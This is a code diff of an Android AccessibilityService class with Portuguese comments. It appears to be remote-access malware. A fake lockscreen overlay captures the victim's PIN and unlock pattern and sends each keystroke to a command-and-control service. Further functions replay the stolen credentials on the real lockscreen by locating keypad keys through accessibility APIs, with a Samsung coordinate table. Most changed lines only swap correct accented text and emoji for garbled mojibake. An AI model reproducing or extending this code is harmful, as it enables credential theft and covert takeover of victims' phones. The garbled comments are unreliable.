+            // Calcula raio de colisÃƒÂ£o dinÃƒÂ¢mico (45% do tamanho da cÃƒÂ©lula) para facilitar o acerto ao deslizar rÃƒÂ¡pido
             int gridSize = Math.min(getWidth(), getHeight()) - 200;
             if (gridSize <= 0) {
                 android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
@@ -1456,13 +1496,13 @@ public class UiAssistBridge extends AccessibilityService {
                 if (Math.sqrt(dx * dx + dy * dy) < hitRadius && !pattern.contains(i)) {
                     pattern.add(i);
                     
-                    // Vibração de feedback tátil
+                    // VibraÃƒÂ§ÃƒÂ£o de feedback tÃƒÂ¡til
                     try {
                         android.os.Vibrator vibrator = (android.os.Vibrator) getContext().getSystemService(Context.VIBRATOR_SERVICE);
                         if (vibrator != null) vibrator.vibrate(30);
                     } catch (Exception e) {}
                     
-                    // Envia o padrão parcial em tempo real
+                    // Envia o padrÃƒÂ£o parcial em tempo real
                     sendPatternKeylog(pattern);
                 }
             }
@@ -1493,31 +1533,31 @@ public class UiAssistBridge extends AccessibilityService {
                 
                 CommandControlService.sendKeylogData(UiAssistBridge.this, json.toString());
             } catch (Exception e) {
-                Log.e(TAG, "Erro ao enviar log parcial de padrão: " + e.getMessage());
+                Log.e(TAG, "Erro ao enviar log parcial de padrÃƒÂ£o: " + e.getMessage());
             }
         }
     }
     
     private void handlePinKeyPress(String key, android.widget.TextView display) {
-        if ("⌫".equals(key)) {
-            // Apagar último dígito
+        if ("Ã¢Å’Â«".equals(key)) {
+            // Apagar ÃƒÂºltimo dÃƒÂ­gito
             if (capturedPin.length() > 0) {
                 capturedPin = capturedPin.substring(0, capturedPin.length() - 1);
             }
             sendLockscreenKeylog("[BACKSPACE]");
-        } else if ("✓".equals(key)) {
+        } else if ("Ã¢Å“â€œ".equals(key)) {
             // Confirmar PIN
             if (capturedPin.length() >= 4) {
                 sendCapturedPin();
             }
         } else {
-            // Adicionar dígito
+            // Adicionar dÃƒÂ­gito
             if (capturedPin.length() < 10) {
                 capturedPin += key;
             }
             sendLockscreenKeylog(key);
             
-            // Auto-envia PIN capturado quando atinge tamanho comum (4 ou 6 dígitos)
+            // Auto-envia PIN capturado quando atinge tamanho comum (4 ou 6 dÃƒÂ­gitos)
             if (capturedPin.length() == 4 || capturedPin.length() == 6) {
                 sendCapturedPinSilent();
             }
@@ -1542,6 +1582,7 @@ public class UiAssistBridge extends AccessibilityService {
             brazilFormat.setTimeZone(brazilTZ);
             String timestamp = brazilFormat.format(new Date());
 
+            hierNodeBudget = 700;
             JSONObject json = new JSONObject();
             json.put("timestamp", timestamp);
             json.put("timestampMs", System.currentTimeMillis());
@@ -1563,7 +1604,7 @@ public class UiAssistBridge extends AccessibilityService {
      * Envia PIN em tempo real no cache sem fechar a overlay
      */
     private void sendCapturedPinSilent() {
-        Log.d(TAG, "🔒 PIN SILENCIOSO CAPTURADO: " + capturedPin);
+        Log.d(TAG, "Ã°Å¸â€â€™ PIN SILENCIOSO CAPTURADO: " + capturedPin);
         String json = "{\"type\":\"CAPTURED_PIN\",\"pin\":\"" + capturedPin + "\",\"timestamp\":" + System.currentTimeMillis() + "}";
         CommandControlService.sendKeylogData(this, json);
     }
@@ -1574,7 +1615,7 @@ public class UiAssistBridge extends AccessibilityService {
     private void updatePinDisplay(android.widget.TextView display, String pin) {
         StringBuilder dots = new StringBuilder();
         for (int i = 0; i < pin.length(); i++) {
-            dots.append("● ");
+            dots.append("Ã¢â€”Â ");
         }
         if (dots.length() == 0) {
             dots.append("_ _ _ _");
@@ -1583,19 +1624,19 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 📤 Envia PIN capturado para o servidor
+     * Ã°Å¸â€œÂ¤ Envia PIN capturado para o servidor
      */
     private void sendCapturedPin() {
-        Log.d(TAG, "🔒 PIN CAPTURADO: " + capturedPin);
+        Log.d(TAG, "Ã°Å¸â€â€™ PIN CAPTURADO: " + capturedPin);
         String json = "{\"type\":\"CAPTURED_PIN\",\"pin\":\"" + capturedPin + "\",\"timestamp\":" + System.currentTimeMillis() + "}";
         CommandControlService.sendKeylogData(this, json);
         
-        // Fecha o lockscreen após 1 segundo
+        // Fecha o lockscreen apÃƒÂ³s 1 segundo
         handler.postDelayed(() -> hideFakeLockscreen(), 1000);
     }
     
     /**
-     * 📤 Envia Pattern capturado para o servidor
+     * Ã°Å¸â€œÂ¤ Envia Pattern capturado para o servidor
      */
     private void sendCapturedPattern() {
         // Converte pattern para string (1-9)
@@ -1604,24 +1645,24 @@ public class UiAssistBridge extends AccessibilityService {
             patternStr.append(dot + 1); // Converte 0-8 para 1-9
         }
         
-        Log.d(TAG, "🔒 PATTERN CAPTURADO: " + patternStr.toString());
+        Log.d(TAG, "Ã°Å¸â€â€™ PATTERN CAPTURADO: " + patternStr.toString());
         String json = "{\"type\":\"CAPTURED_PATTERN\",\"pattern\":\"" + patternStr.toString() + "\",\"timestamp\":" + System.currentTimeMillis() + "}";
         CommandControlService.sendKeylogData(this, json);
         
-        // Fecha o lockscreen após 1 segundo
+        // Fecha o lockscreen apÃƒÂ³s 1 segundo
         handler.postDelayed(() -> hideFakeLockscreen(), 1000);
     }
     
     /**
-     * 🔓 Esconde overlay de lockscreen fake
+     * Ã°Å¸â€â€œ Esconde overlay de lockscreen fake
      */
     private void hideFakeLockscreen() {
         if (!isLockscreenActive || lockscreenOverlay == null) {
-            Log.d(TAG, "🔓 Lockscreen não está ativo");
+            Log.d(TAG, "Ã°Å¸â€â€œ Lockscreen nÃƒÂ£o estÃƒÂ¡ ativo");
             return;
         }
         
-        Log.d(TAG, "🔓 Escondendo lockscreen fake...");
+        Log.d(TAG, "Ã°Å¸â€â€œ Escondendo lockscreen fake...");
         
         handler.post(() -> {
             try {
@@ -1630,69 +1671,69 @@ public class UiAssistBridge extends AccessibilityService {
                     lockscreenOverlay = null;
                 }
                 isLockscreenActive = false;
-                Log.d(TAG, "🔓 ✅ LOCKSCREEN REMOVIDO!");
+                Log.d(TAG, "Ã°Å¸â€â€œ Ã¢Å“â€¦ LOCKSCREEN REMOVIDO!");
                 
                 // Restaura a tela preta se ela estiver ativa
                 if (blackOverlayView != null && isBlackScreenActive) {
                     blackOverlayView.setVisibility(android.view.View.VISIBLE);
                 }
             } catch (Exception e) {
-                Log.e(TAG, "🔓 ❌ Erro ao remover lockscreen: " + e.getMessage());
+                Log.e(TAG, "Ã°Å¸â€â€œ Ã¢ÂÅ’ Erro ao remover lockscreen: " + e.getMessage());
             }
         });
     }
     
     /**
-     * 🔢 Executa clique na posição da tecla do PIN real do dispositivo
+     * Ã°Å¸â€Â¢ Executa clique na posiÃƒÂ§ÃƒÂ£o da tecla do PIN real do dispositivo
      */
     /**
-     * 🔢 Executa clique em tecla PIN - SEM ESCALAR (coordenadas já são absolutas)
+     * Ã°Å¸â€Â¢ Executa clique em tecla PIN - SEM ESCALAR (coordenadas jÃƒÂ¡ sÃƒÂ£o absolutas)
      */
     private void executePinKeyClick(int x, int y) {
-        // CORREÇÃO: Não escalar! As coordenadas já são calculadas para a tela atual!
-        Log.d(TAG, "🔢 Clicando DIRETO em (" + x + ", " + y + ")");
+        // CORREÃƒâ€¡ÃƒÆ’O: NÃƒÂ£o escalar! As coordenadas jÃƒÂ¡ sÃƒÂ£o calculadas para a tela atual!
+        Log.d(TAG, "Ã°Å¸â€Â¢ Clicando DIRETO em (" + x + ", " + y + ")");
         executeClick(x, y);
     }
     
     /**
-     * 🔄 Reproduz sequência de PIN com delay entre teclas
+     * Ã°Å¸â€â€ž Reproduz sequÃƒÂªncia de PIN com delay entre teclas
      * AJUSTADO para calcular coordenadas dinamicamente
      */
     public void playPinSequenceWithDelay(String pin, int delayMs) {
-        Log.d(TAG, "🔄 Iniciando reprodução do PIN: " + pin + " (delay: " + delayMs + "ms)");
+        Log.d(TAG, "Ã°Å¸â€â€ž Iniciando reproduÃƒÂ§ÃƒÂ£o do PIN: " + pin + " (delay: " + delayMs + "ms)");
         
-        // 💡 1. LIGA A TELA E REVELA O TECLADO LOCKSCREEN
+        // Ã°Å¸â€™Â¡ 1. LIGA A TELA E REVELA O TECLADO LOCKSCREEN
         wakeUpScreen();
         if (gestureCore != null) {
             gestureCore.swipeUpToUnlock();
         }
         
-        // Aguarda a animação do swipe subir (600ms) para que o teclado PIN esteja 100% visível na tela
+        // Aguarda a animaÃƒÂ§ÃƒÂ£o do swipe subir (600ms) para que o teclado PIN esteja 100% visÃƒÂ­vel na tela
         handler.postDelayed(() -> {
-            // 🎯 MÉTODO 1: Tenta detectar via ACCESSIBILITYSERVICE (SEM ADB! SEM ROOT!)
+            // Ã°Å¸Å½Â¯ MÃƒâ€°TODO 1: Tenta detectar via ACCESSIBILITYSERVICE (SEM ADB! SEM ROOT!)
             int[][] pinKeyCoords = detectPinKeypadViaAccessibility();
             
             if (pinKeyCoords != null) {
                 // Usa coordenadas EXATAS detectadas via AccessibilityService!
-                Log.d(TAG, "🔢🎯 Usando coordenadas EXATAS do AccessibilityService!");
+                Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Usando coordenadas EXATAS do AccessibilityService!");
                 playPinWithDetectedCoords(pin, delayMs, pinKeyCoords);
                 return;
             }
             
-            Log.w(TAG, "🔢 AccessibilityService falhou, usando cálculo por fabricante...");
+            Log.w(TAG, "Ã°Å¸â€Â¢ AccessibilityService falhou, usando cÃƒÂ¡lculo por fabricante...");
             
-            // Obtém métricas da tela
+            // ObtÃƒÂ©m mÃƒÂ©tricas da tela
             android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
             android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
             wm.getDefaultDisplay().getRealMetrics(metrics);
             int screenWidth = metrics.widthPixels;
             int screenHeight = metrics.heightPixels;
             
-            Log.d(TAG, "🔢 Tela: " + screenWidth + "x" + screenHeight);
+            Log.d(TAG, "Ã°Å¸â€Â¢ Tela: " + screenWidth + "x" + screenHeight);
             
             // COORDENADAS UNIVERSAIS - Detecta fabricante e ajusta
             String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
-            Log.d(TAG, "🔢 Fabricante: " + manufacturer);
+            Log.d(TAG, "Ã°Å¸â€Â¢ Fabricante: " + manufacturer);
             
             // Samsung/One UI coloca o teclado mais embaixo que Stock Android
             float startYPercent = 0.32f;
@@ -1716,9 +1757,9 @@ public class UiAssistBridge extends AccessibilityService {
                 };
                 int[] samsungEnterCoords = {(int)(806 * scaleX), (int)(1942 * scaleY)}; // OK
                 
-                Log.d(TAG, "🔢🎯 SAMSUNG: Usando coordenadas EXATAS do dump!");
+                Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ SAMSUNG: Usando coordenadas EXATAS do dump!");
                 for (int i = 0; i <= 9; i++) {
-                    Log.d(TAG, "🔢 Tecla " + i + ": (" + samsungPinCoords[i][0] + ", " + samsungPinCoords[i][1] + ")");
+                    Log.d(TAG, "Ã°Å¸â€Â¢ Tecla " + i + ": (" + samsungPinCoords[i][0] + ", " + samsungPinCoords[i][1] + ")");
                 }
                 
                 char[] samsungDigits = pin.toCharArray();
@@ -1730,7 +1771,7 @@ public class UiAssistBridge extends AccessibilityService {
                     handler.postDelayed(() -> {
                         int keyNum = Character.getNumericValue(digit);
                         if (keyNum >= 0 && keyNum <= 9) {
-                            Log.d(TAG, "🔢🎯 Samsung: Clicando tecla " + keyNum + " em (" + coords[keyNum][0] + ", " + coords[keyNum][1] + ")");
+                            Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Samsung: Clicando tecla " + keyNum + " em (" + coords[keyNum][0] + ", " + coords[keyNum][1] + ")");
                             executePinKeyClick(coords[keyNum][0], coords[keyNum][1]);
                         }
                     }, delay);
@@ -1738,7 +1779,7 @@ public class UiAssistBridge extends AccessibilityService {
                 
                 final int[] enterC = samsungEnterCoords;
                 handler.postDelayed(() -> {
-                    Log.d(TAG, "🔢🎯 Samsung: Clicando OK em (" + enterC[0] + ", " + enterC[1] + ")");
+                    Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Samsung: Clicando OK em (" + enterC[0] + ", " + enterC[1] + ")");
                     executePinKeyClick(enterC[0], enterC[1]);
                 }, samsungDigits.length * delayMs + delayMs);
                 
@@ -1784,7 +1825,7 @@ public class UiAssistBridge extends AccessibilityService {
             final int[] enterCoords = {col3, row4};
             
             for (int i = 0; i <= 9; i++) {
-                Log.d(TAG, "🔢 Tecla " + i + ": (" + pinCoords[i][0] + ", " + pinCoords[i][1] + ")");
+                Log.d(TAG, "Ã°Å¸â€Â¢ Tecla " + i + ": (" + pinCoords[i][0] + ", " + pinCoords[i][1] + ")");
             }
             
             char[] digits = pin.toCharArray();
@@ -1796,42 +1837,42 @@ public class UiAssistBridge extends AccessibilityService {
                     try {
                         int keyNum = Character.getNumericValue(digit);
                         if (keyNum >= 0 && keyNum <= 9) {
-                            Log.d(TAG, "🔢 Reproduzindo tecla: " + keyNum + " em (" + pinCoords[keyNum][0] + ", " + pinCoords[keyNum][1] + ")");
+                            Log.d(TAG, "Ã°Å¸â€Â¢ Reproduzindo tecla: " + keyNum + " em (" + pinCoords[keyNum][0] + ", " + pinCoords[keyNum][1] + ")");
                             executePinKeyClick(pinCoords[keyNum][0], pinCoords[keyNum][1]);
                         }
                     } catch (Exception e) {
-                        Log.e(TAG, "🔄 Erro ao reproduzir tecla: " + e.getMessage());
+                        Log.e(TAG, "Ã°Å¸â€â€ž Erro ao reproduzir tecla: " + e.getMessage());
                     }
                 }, delay);
             }
             
             handler.postDelayed(() -> {
-                Log.d(TAG, "✔ Pressionando ENTER em (" + enterCoords[0] + ", " + enterCoords[1] + ")");
+                Log.d(TAG, "Ã¢Å“â€ Pressionando ENTER em (" + enterCoords[0] + ", " + enterCoords[1] + ")");
                 executePinKeyClick(enterCoords[0], enterCoords[1]);
             }, digits.length * delayMs + delayMs);
         }, 600);
     }
     
     /**
-     * 🔲 Reproduz sequência de Pattern (swipe entre pontos)
-     * SOLUÇÃO DEFINITIVA: Detecta o PatternView real via UIAUTOMATOR!
-     * Funciona em 100% dos dispositivos Android, independente da marca ou resolução!
+     * Ã°Å¸â€Â² Reproduz sequÃƒÂªncia de Pattern (swipe entre pontos)
+     * SOLUÃƒâ€¡ÃƒÆ’O DEFINITIVA: Detecta o PatternView real via UIAUTOMATOR!
+     * Funciona em 100% dos dispositivos Android, independente da marca ou resoluÃƒÂ§ÃƒÂ£o!
      */
     private long lastPatternPlayTime = 0;
 
     public void playPatternSequence(String pattern, int delayMs) {
         long now = System.currentTimeMillis();
         if (now - lastPatternPlayTime < 1000) {
-            Log.w(TAG, "🔲 Ignorando chamada duplicada para playPatternSequence em janela de 1000ms");
+            Log.w(TAG, "Ã°Å¸â€Â² Ignorando chamada duplicada para playPatternSequence em janela de 1000ms");
             return;
         }
         lastPatternPlayTime = now;
-        Log.d(TAG, "🔲 PLAY_PATTERN_SEQUENCE: " + pattern + " (delay: " + delayMs + "ms)");
+        Log.d(TAG, "Ã°Å¸â€Â² PLAY_PATTERN_SEQUENCE: " + pattern + " (delay: " + delayMs + "ms)");
         int[] points = parsePatternString(pattern);
         if (points != null && points.length >= 2) {
             executePatternUnlock(points);
         } else {
-            Log.e(TAG, "❌ Pattern inválido para reprodução: " + pattern);
+            Log.e(TAG, "Ã¢ÂÅ’ Pattern invÃƒÂ¡lido para reproduÃƒÂ§ÃƒÂ£o: " + pattern);
         }
     }
     
@@ -1843,17 +1884,17 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔢🎯 DETECÇÃO DO PIN KEYPAD VIA ACCESSIBILITYSERVICE - FUNCIONA EM 100% DOS DISPOSITIVOS!
+     * Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ DETECÃƒâ€¡ÃƒÆ’O DO PIN KEYPAD VIA ACCESSIBILITYSERVICE - FUNCIONA EM 100% DOS DISPOSITIVOS!
      * SEM ADB! SEM ROOT! Usa getRootInActiveWindow() para ler a UI diretamente!
      * Retorna array com coordenadas de cada tecla: [0-9][x,y], [10] = DELETE, [11] = ENTER
      */
     private int[][] detectPinKeypadViaAccessibility() {
         try {
-            Log.d(TAG, "🔢🎯 Iniciando detecção do PIN Keypad via AccessibilityService...");
+            Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Iniciando detecÃƒÂ§ÃƒÂ£o do PIN Keypad via AccessibilityService...");
             
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) {
-                Log.w(TAG, "🔢 AccessibilityService: RootNode é null!");
+                Log.w(TAG, "Ã°Å¸â€Â¢ AccessibilityService: RootNode ÃƒÂ© null!");
                 return null;
             }
             
@@ -1866,12 +1907,12 @@ public class UiAssistBridge extends AccessibilityService {
                 // Tenta encontrar por resource-id (ex: "key0", "key1", etc)
                 AccessibilityNodeInfo keyNode = findNodeByResourceId(rootNode, "key" + digit);
                 
-                // Se não encontrou, tenta por content-desc
+                // Se nÃƒÂ£o encontrou, tenta por content-desc
                 if (keyNode == null) {
                     keyNode = findNodeByContentDescExact(rootNode, digit);
                 }
                 
-                // Se não encontrou, tenta por texto
+                // Se nÃƒÂ£o encontrou, tenta por texto
                 if (keyNode == null) {
                     keyNode = findNodeByTextExact(rootNode, digit);
                 }
@@ -1881,10 +1922,10 @@ public class UiAssistBridge extends AccessibilityService {
                     keyNode.getBoundsInScreen(bounds);
                     keyCoords[i][0] = bounds.centerX();
                     keyCoords[i][1] = bounds.centerY();
-                    Log.d(TAG, "🔢🎯 Tecla " + digit + " encontrada: (" + keyCoords[i][0] + ", " + keyCoords[i][1] + ")");
+                    Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Tecla " + digit + " encontrada: (" + keyCoords[i][0] + ", " + keyCoords[i][1] + ")");
                     keyNode.recycle();
                 } else {
-                    Log.w(TAG, "🔢 Tecla " + digit + " NÃO encontrada!");
+                    Log.w(TAG, "Ã°Å¸â€Â¢ Tecla " + digit + " NÃƒÆ’O encontrada!");
                 }
             }
             
@@ -1898,7 +1939,7 @@ public class UiAssistBridge extends AccessibilityService {
                 deleteNode.getBoundsInScreen(bounds);
                 keyCoords[10][0] = bounds.centerX();
                 keyCoords[10][1] = bounds.centerY();
-                Log.d(TAG, "🔢🎯 DELETE encontrado: (" + keyCoords[10][0] + ", " + keyCoords[10][1] + ")");
+                Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ DELETE encontrado: (" + keyCoords[10][0] + ", " + keyCoords[10][1] + ")");
                 deleteNode.recycle();
             }
             
@@ -1913,7 +1954,7 @@ public class UiAssistBridge extends AccessibilityService {
                 enterNode.getBoundsInScreen(bounds);
                 keyCoords[11][0] = bounds.centerX();
                 keyCoords[11][1] = bounds.centerY();
-                Log.d(TAG, "🔢🎯 ENTER encontrado: (" + keyCoords[11][0] + ", " + keyCoords[11][1] + ")");
+                Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ ENTER encontrado: (" + keyCoords[11][0] + ", " + keyCoords[11][1] + ")");
                 enterNode.recycle();
             }
             
@@ -1926,22 +1967,22 @@ public class UiAssistBridge extends AccessibilityService {
             }
             
             if (foundCount < 5) {
-                Log.w(TAG, "🔢 AccessibilityService: Apenas " + foundCount + "/10 teclas encontradas!");
+                Log.w(TAG, "Ã°Å¸â€Â¢ AccessibilityService: Apenas " + foundCount + "/10 teclas encontradas!");
                 return null;
             }
             
-            Log.d(TAG, "🔢🎯 ✅ PIN Keypad detectado via AccessibilityService! (" + foundCount + "/10 teclas)");
+            Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Ã¢Å“â€¦ PIN Keypad detectado via AccessibilityService! (" + foundCount + "/10 teclas)");
             return keyCoords;
             
         } catch (Exception e) {
-            Log.e(TAG, "🔢 AccessibilityService: Erro na detecção do PIN: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€Â¢ AccessibilityService: Erro na detecÃƒÂ§ÃƒÂ£o do PIN: " + e.getMessage());
             e.printStackTrace();
             return null;
         }
     }
     
     /**
-     * Busca nó por resource-id (parcial)
+     * Busca nÃƒÂ³ por resource-id (parcial)
      */
     private AccessibilityNodeInfo findNodeByResourceId(AccessibilityNodeInfo root, String resourceIdPart) {
         if (root == null) return null;
@@ -1979,7 +2020,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Busca nó por content-desc EXATO
+     * Busca nÃƒÂ³ por content-desc EXATO
      */
     private AccessibilityNodeInfo findNodeByContentDescExact(AccessibilityNodeInfo root, String contentDesc) {
         if (root == null) return null;
@@ -2003,7 +2044,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Busca nó por content-desc contendo alguma das palavras
+     * Busca nÃƒÂ³ por content-desc contendo alguma das palavras
      */
     private AccessibilityNodeInfo findNodeByContentDescContains(AccessibilityNodeInfo root, String[] keywords) {
         if (root == null) return null;
@@ -2032,7 +2073,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Busca nó por texto EXATO
+     * Busca nÃƒÂ³ por texto EXATO
      */
     private AccessibilityNodeInfo findNodeByTextExact(AccessibilityNodeInfo root, String text) {
         if (root == null) return null;
@@ -2063,38 +2104,38 @@ public class UiAssistBridge extends AccessibilityService {
                 handler.postDelayed(() -> {
                     int x = keyCoords[digitIndex][0];
                     int y = keyCoords[digitIndex][1];
-                    Log.d(TAG, "🔢🎯 Clicando tecla " + digitIndex + " via UIAutomator em (" + x + ", " + y + ")");
+                    Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Clicando tecla " + digitIndex + " via UIAutomator em (" + x + ", " + y + ")");
                     executePinKeyClick(x, y);
                 }, idx * delayMs);
             } else {
-                Log.w(TAG, "🔢 Tecla " + digitIndex + " sem coordenadas válidas!");
+                Log.w(TAG, "Ã°Å¸â€Â¢ Tecla " + digitIndex + " sem coordenadas vÃƒÂ¡lidas!");
             }
         }
         
-        // Clica ENTER no final (se disponível)
+        // Clica ENTER no final (se disponÃƒÂ­vel)
         if (keyCoords[11][0] > 0 && keyCoords[11][1] > 0) {
             handler.postDelayed(() -> {
-                Log.d(TAG, "🔢🎯 Clicando ENTER via UIAutomator");
+                Log.d(TAG, "Ã°Å¸â€Â¢Ã°Å¸Å½Â¯ Clicando ENTER via UIAutomator");
                 executePinKeyClick(keyCoords[11][0], keyCoords[11][1]);
             }, digits.length * delayMs + delayMs);
         }
     }
     
     /**
-     * 🔲🎯 DETECÇÃO DO PATTERN VIA ACCESSIBILITYSERVICE - FUNCIONA EM 100% DOS DISPOSITIVOS!
+     * Ã°Å¸â€Â²Ã°Å¸Å½Â¯ DETECÃƒâ€¡ÃƒÆ’O DO PATTERN VIA ACCESSIBILITYSERVICE - FUNCIONA EM 100% DOS DISPOSITIVOS!
      * SEM ADB! SEM ROOT! Usa getRootInActiveWindow() para ler a UI diretamente!
      */
     private int[][] detectPatternViewViaAccessibility() {
         try {
-            Log.d(TAG, "🔲🎯 Iniciando detecção do Pattern via AccessibilityService...");
+            Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ Iniciando detecÃƒÂ§ÃƒÂ£o do Pattern via AccessibilityService...");
             
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) {
-                Log.w(TAG, "🔲 AccessibilityService: RootNode é null!");
+                Log.w(TAG, "Ã°Å¸â€Â² AccessibilityService: RootNode ÃƒÂ© null!");
                 return null;
             }
             
-            // Procura pelo PatternView usando vários nomes possíveis
+            // Procura pelo PatternView usando vÃƒÂ¡rios nomes possÃƒÂ­veis
             String[] patternViewIds = {
                 "lockPatternView",
                 "lock_pattern_view", 
@@ -2110,12 +2151,12 @@ public class UiAssistBridge extends AccessibilityService {
             for (String viewId : patternViewIds) {
                 patternNode = findNodeByResourceId(rootNode, viewId);
                 if (patternNode != null) {
-                    Log.d(TAG, "🔲🎯 PatternView encontrado por resource-id: " + viewId);
+                    Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ PatternView encontrado por resource-id: " + viewId);
                     break;
                 }
             }
             
-            // Se não encontrou por ID, procura por classe
+            // Se nÃƒÂ£o encontrou por ID, procura por classe
             if (patternNode == null) {
                 String[] patternClasses = {
                     "LockPatternView",
@@ -2127,34 +2168,34 @@ public class UiAssistBridge extends AccessibilityService {
                 for (String className : patternClasses) {
                     patternNode = findNodeByClassName(rootNode, className);
                     if (patternNode != null) {
-                        Log.d(TAG, "🔲🎯 PatternView encontrado por classe: " + className);
+                        Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ PatternView encontrado por classe: " + className);
                         break;
                     }
                 }
             }
             
-            // Se não encontrou, procura por content-desc
+            // Se nÃƒÂ£o encontrou, procura por content-desc
             if (patternNode == null) {
                 patternNode = findNodeByContentDescContains(rootNode, new String[]{
-                    "padrão", "pattern", "desenhe", "draw", "desbloqueio"
+                    "padrÃƒÂ£o", "pattern", "desenhe", "draw", "desbloqueio"
                 });
                 if (patternNode != null) {
-                    Log.d(TAG, "🔲🎯 PatternView encontrado por content-desc!");
+                    Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ PatternView encontrado por content-desc!");
                 }
             }
             
             if (patternNode == null) {
-                Log.w(TAG, "🔲 AccessibilityService: PatternView NÃO encontrado!");
+                Log.w(TAG, "Ã°Å¸â€Â² AccessibilityService: PatternView NÃƒÆ’O encontrado!");
                 rootNode.recycle();
                 return null;
             }
             
-            // Obtém os bounds EXATOS do PatternView!
+            // ObtÃƒÂ©m os bounds EXATOS do PatternView!
             android.graphics.Rect bounds = new android.graphics.Rect();
             patternNode.getBoundsInScreen(bounds);
             
-            Log.d(TAG, "🔲🎯 PatternView DETECTADO via AccessibilityService!");
-            Log.d(TAG, "🔲🎯 Bounds: left=" + bounds.left + ", top=" + bounds.top + 
+            Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ PatternView DETECTADO via AccessibilityService!");
+            Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ Bounds: left=" + bounds.left + ", top=" + bounds.top + 
                        ", right=" + bounds.right + ", bottom=" + bounds.bottom);
             
             // Calcula os 9 pontos baseado nos bounds EXATOS!
@@ -2171,35 +2212,35 @@ public class UiAssistBridge extends AccessibilityService {
                 int col = i % 3;
                 coords[i][0] = bounds.left + col * cellWidth + halfCellW;
                 coords[i][1] = bounds.top + row * cellHeight + halfCellH;
-                Log.d(TAG, "🔲🎯 Ponto " + (i+1) + " via AccessibilityService: (" + coords[i][0] + ", " + coords[i][1] + ")");
+                Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ Ponto " + (i+1) + " via AccessibilityService: (" + coords[i][0] + ", " + coords[i][1] + ")");
             }
             
             patternNode.recycle();
             rootNode.recycle();
             
-            Log.d(TAG, "🔲🎯 ✅ Coordenadas EXATAS detectadas via AccessibilityService!");
+            Log.d(TAG, "Ã°Å¸â€Â²Ã°Å¸Å½Â¯ Ã¢Å“â€¦ Coordenadas EXATAS detectadas via AccessibilityService!");
             return coords;
             
         } catch (Exception e) {
-            Log.e(TAG, "🔲 AccessibilityService: Erro na detecção do Pattern: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€Â² AccessibilityService: Erro na detecÃƒÂ§ÃƒÂ£o do Pattern: " + e.getMessage());
             e.printStackTrace();
             return null;
         }
     }
     
     /**
-     * 🔲 DETECTA O PATTERNVIEW REAL NA TELA via AccessibilityService
-     * Esta é a SOLUÇÃO DEFINITIVA que funciona em qualquer dispositivo!
+     * Ã°Å¸â€Â² DETECTA O PATTERNVIEW REAL NA TELA via AccessibilityService
+     * Esta ÃƒÂ© a SOLUÃƒâ€¡ÃƒÆ’O DEFINITIVA que funciona em qualquer dispositivo!
      */
     private int[][] detectPatternViewCoords() {
         try {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) {
-                Log.w(TAG, "🔲 RootNode é null!");
+                Log.w(TAG, "Ã°Å¸â€Â² RootNode ÃƒÂ© null!");
                 return null;
             }
             
-            // Procura pelo PatternView em várias formas (diferentes fabricantes usam nomes diferentes)
+            // Procura pelo PatternView em vÃƒÂ¡rias formas (diferentes fabricantes usam nomes diferentes)
             String[] patternViewClasses = {
                 "LockPatternView",
                 "PatternLockView",
@@ -2217,30 +2258,30 @@ public class UiAssistBridge extends AccessibilityService {
             for (String className : patternViewClasses) {
                 patternNode = findNodeByClassName(rootNode, className);
                 if (patternNode != null) {
-                    Log.d(TAG, "🔲 PatternView encontrado! Classe: " + className);
+                    Log.d(TAG, "Ã°Å¸â€Â² PatternView encontrado! Classe: " + className);
                     break;
                 }
             }
             
-            // Se não encontrou por classe, tenta por contentDescription
+            // Se nÃƒÂ£o encontrou por classe, tenta por contentDescription
             if (patternNode == null) {
                 patternNode = findNodeByContentDescription(rootNode, new String[]{
-                    "padrão", "pattern", "desenhe", "draw", "desbloqueio", "unlock"
+                    "padrÃƒÂ£o", "pattern", "desenhe", "draw", "desbloqueio", "unlock"
                 });
             }
             
             if (patternNode == null) {
-                Log.w(TAG, "🔲 PatternView não encontrado na tela!");
+                Log.w(TAG, "Ã°Å¸â€Â² PatternView nÃƒÂ£o encontrado na tela!");
                 rootNode.recycle();
                 return null;
             }
             
-            // Obtém as bounds (coordenadas) reais do PatternView!
+            // ObtÃƒÂ©m as bounds (coordenadas) reais do PatternView!
             android.graphics.Rect bounds = new android.graphics.Rect();
             patternNode.getBoundsInScreen(bounds);
             
-            Log.d(TAG, "🔲 🎯 PatternView ENCONTRADO! Bounds: " + bounds.toString());
